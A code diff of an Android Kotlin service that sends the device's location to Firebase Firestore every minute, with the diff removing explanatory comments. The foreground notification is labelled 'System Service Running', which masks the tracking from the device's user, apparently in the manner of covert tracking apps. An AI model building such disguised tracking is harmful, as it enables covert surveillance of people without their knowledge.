@@ -16,13 +16,10 @@ import com.google.firebase.firestore.FirebaseFirestore
 import java.util.*
 import com.google.android.gms.location.*
 
-/**
- * Service that tracks the device location and uploads to Firebase
- */
 class LocationService : Service() {
     companion object {
         private const val TAG = "LocationService"
-        private const val LOCATION_UPDATE_INTERVAL = 60000L // 1 minute
+        private const val LOCATION_UPDATE_INTERVAL = 60000L 
         private const val NOTIFICATION_ID = 1001
         private const val CHANNEL_ID = "location_channel"
         private const val CHANNEL_NAME = "Location Tracker"
@@ -44,7 +41,6 @@ class LocationService : Service() {
         firestore = FirebaseFirestore.getInstance()
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         
-        // Create the notification channel
         NotificationChannelManager.createNotificationChannel(
             this,
             CHANNEL_ID,
@@ -52,7 +48,6 @@ class LocationService : Service() {
             NotificationManager.IMPORTANCE_LOW
         )
         
-        // Initialize location callback
         locationCallback = object : LocationCallback() {
             override fun onLocationResult(locationResult: LocationResult) {
                 locationResult.lastLocation?.let { location ->
@@ -66,11 +61,9 @@ class LocationService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "LocationService started")
         
-        // Create a notification for the foreground service
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
         
-        // Start location updates
         startLocationUpdates()
         
         return START_STICKY
@@ -86,7 +79,7 @@ class LocationService : Service() {
     }
     
     private fun createNotification(): Notification {
-        // Create an intent that will open the app when tapped
+        
         val notificationIntent = Intent(this, this::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this,
@@ -95,7 +88,6 @@ class LocationService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         
-        // Build the notification
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service Running")
             .setContentText("Maintaining system services...")
@@ -111,7 +103,6 @@ class LocationService : Service() {
             LOCATION_UPDATE_INTERVAL
         ).build()
         
-        // Check permissions
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.ACCESS_FINE_LOCATION
@@ -124,14 +115,12 @@ class LocationService : Service() {
             return
         }
         
-        // Request location updates
         fusedLocationClient.requestLocationUpdates(
             locationRequest,
             locationCallback,
             Looper.getMainLooper()
         )
         
-        // Get last known location immediately
         fusedLocationClient.lastLocation.addOnSuccessListener { location ->
             location?.let {
                 Log.d(TAG, "Last known location: ${it.latitude}, ${it.longitude}")
@@ -156,7 +145,7 @@ class LocationService : Service() {
             "accuracy" to accuracy,
             "altitude" to altitude,
             "timestamp" to Timestamp.now(),
-            "isInsideGeofence" to true // Default value, would be updated by geofence logic
+            "isInsideGeofence" to true 
         )
         
         firestore.collection("locations")
